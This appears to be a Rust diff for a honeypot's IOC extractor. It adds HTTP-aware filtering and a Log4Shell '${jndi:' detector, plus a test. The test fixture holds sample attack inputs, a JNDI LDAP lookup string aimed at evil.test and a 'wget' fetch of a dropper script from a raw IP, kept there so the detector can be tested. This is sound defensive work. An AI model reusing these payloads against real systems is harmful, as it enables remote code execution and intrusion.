@@ -22,9 +22,135 @@ pub fn extract_iocs(text: &str) -> Vec<IocItem> {
     extract_urls(text, None, &mut items, &mut seen);
     extract_tftp_commands(text, &mut items, &mut seen);
     extract_base64_payloads(text, &mut items, &mut seen);
+    extract_jndi_payloads(text, &mut items, &mut seen);
 
     items.truncate(MAX_IOCS_PER_EVENT);
     items
+}
+
+/// Extract IOCs aware of protocol context so standard HTTP headers (Referer, User-Agent, Origin)
+/// from browsers or uptime monitors are never recorded as attacker IOCs.
+pub fn extract_iocs_for_event(
+    service: &str,
+    request: &str,
+    http_path: Option<&str>,
+    decoded_payload: Option<&str>,
+) -> Vec<IocItem> {
+    let svc = service.to_ascii_lowercase();
+    if matches!(
+        svc.as_str(),
+        "http" | "https" | "http-alt" | "http-proxy" | "https-alt" | "docker" | "elasticsearch" | "ollama"
+    ) {
+        let path = http_path.unwrap_or("");
+        let has_body = decoded_payload.map(|b| !b.trim().is_empty()).unwrap_or(false);
+
+        if is_internal_dashboard_path(path) && !has_body {
+            return Vec::new();
+        }
+
+        let self_host = extract_http_host(request);
+        let mut items = Vec::new();
+        let mut seen = HashSet::new();
+
+        // 1. Scan request body (POST/PUT/PATCH payloads)
+        if let Some(body) = decoded_payload {
+            if !body.trim().is_empty() {
+                extract_urls(body, Some("http-body"), &mut items, &mut seen);
+                extract_tftp_commands(body, &mut items, &mut seen);
+                extract_base64_payloads(body, &mut items, &mut seen);
+            }
+        }
+
+        // 2. Scan query string or absolute proxy URI in http_path
+        if let Some((_, query)) = path.split_once('?') {
+            extract_urls(query, Some("http-query"), &mut items, &mut seen);
+        }
+        let lower_path = path.to_ascii_lowercase();
+        if lower_path.starts_with("http://") || lower_path.starts_with("https://") {
+            extract_urls(path, Some("open-proxy"), &mut items, &mut seen);
+        }
+
+        // 3. Scan anywhere in request (including headers) ONLY for Log4Shell ${jndi:...}
+        extract_jndi_payloads(request, &mut items, &mut seen);
+        if let Some(body) = decoded_payload {
+            extract_jndi_payloads(body, &mut items, &mut seen);
+        }
+
+        // Exclude URLs pointing to the honeypot's own Host header
+        if let Some(ref own_host) = self_host {
+            items.retain(|item| {
+                url_host(&item.value)
+                    .map(|h| h != *own_host)
+                    .unwrap_or(true)
+            });
+        }
+
+        items.truncate(MAX_IOCS_PER_EVENT);
+        items
+    } else {
+        let mut corpus = request.to_string();
+        if let Some(dp) = decoded_payload {
+            corpus.push('\n');
+            corpus.push_str(dp);
+        }
+        extract_iocs(&corpus)
+    }
+}
+
+fn is_internal_dashboard_path(path: &str) -> bool {
+    let base = path.split('?').next().unwrap_or(path);
+    matches!(base, "/" | "/stats" | "/events" | "/robots.txt")
+        || base.starts_with("/api/")
+        || base.starts_with("/static/")
+}
+
+fn extract_http_host(request: &str) -> Option<String> {
+    for line in request.lines() {
+        if let Some((k, v)) = line.split_once(':') {
+            if k.trim().eq_ignore_ascii_case("host") {
+                let host = v
+                    .trim()
+                    .split(':')
+                    .next()
+                    .unwrap_or("")
+                    .to_ascii_lowercase();
+                if !host.is_empty() {
+                    return Some(host);
+                }
+            }
+        }
+    }
+    None
+}
+
+fn url_host(url: &str) -> Option<String> {
+    let after_scheme = url.split_once("://")?.1;
+    let host_port = after_scheme.split(['/', '?', '#']).next()?;
+    let host = host_port.split(':').next()?.to_ascii_lowercase();
+    if host.is_empty() { None } else { Some(host) }
+}
+
+fn extract_jndi_payloads(
+    text: &str,
+    items: &mut Vec<IocItem>,
+    seen: &mut HashSet<(String, String)>,
+) {
+    let lower = text.to_ascii_lowercase();
+    let mut from = 0;
+    while from < lower.len() && items.len() < MAX_IOCS_PER_EVENT {
+        let Some(rel) = lower[from..].find("${jndi:") else {
+            break;
+        };
+        let abs = from + rel;
+        let rest = &text[abs..];
+        let end = rest
+            .find('}')
+            .map(|i| i + 1)
+            .unwrap_or_else(|| rest.len().min(200));
+        let val = rest[..end].trim().to_string();
+        push_ioc(items, seen, "jndi", val, Some("log4shell".to_string()));
+        from = abs + end.max(7);
+    }
 }
 
 /// Defang URLs/IPs/domains for safe UI rendering (e.g. http -> hxxp, . -> [.]).
@@ -315,5 +441,29 @@ mod tests {
             defang("https://evil.example.com/a.b"),
             "hxxps://evil[.]example[.]com/a.b"
         );
+    }
+
+    #[test]
+    fn ignores_http_referer_and_user_agent_urls_but_keeps_body_query_and_jndi() {
+        let browser_req = "GET /api/recent HTTP/1.1\nhost: echo.shmakov.net\nreferer: https://echo.shmakov.net/stats\nuser-agent: Mozilla/5.0";
+        assert!(extract_iocs_for_event("http", browser_req, Some("/api/recent"), None).is_empty());
+
+        let uptime_req = "GET / HTTP/1.1\nhost: echo.shmakov.net\nreferer: https://tail-f.shmakov.net\nuser-agent: Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)";
+        assert!(extract_iocs_for_event("http", uptime_req, Some("/"), None).is_empty());
+
+        let unknown_with_ua = "GET /wp-login.php HTTP/1.1\nhost: echo.shmakov.net\nuser-agent: CheckHost (https://check-host.net/)";
+        assert!(extract_iocs_for_event("http", unknown_with_ua, Some("/wp-login.php"), None).is_empty());
+
+        let attack_req = "POST /wp-login.php HTTP/1.1\nhost: echo.shmakov.net\nx-api: ${jndi:ldap://evil.test/a}";
+        let iocs = extract_iocs_for_event(
+            "http",
+            attack_req,
+            Some("/wp-login.php?next=http://99.88.77.66/stage"),
+            Some("payload=wget+http://45.1.2.3/drop.sh"),
+        );
+        let values: Vec<&str> = iocs.iter().map(|i| i.value.as_str()).collect();
+        assert!(values.contains(&"http://45.1.2.3/drop.sh"));
+        assert!(values.contains(&"http://99.88.77.66/stage"));
+        assert!(values.contains(&"${jndi:ldap://evil.test/a}"));
     }
 }
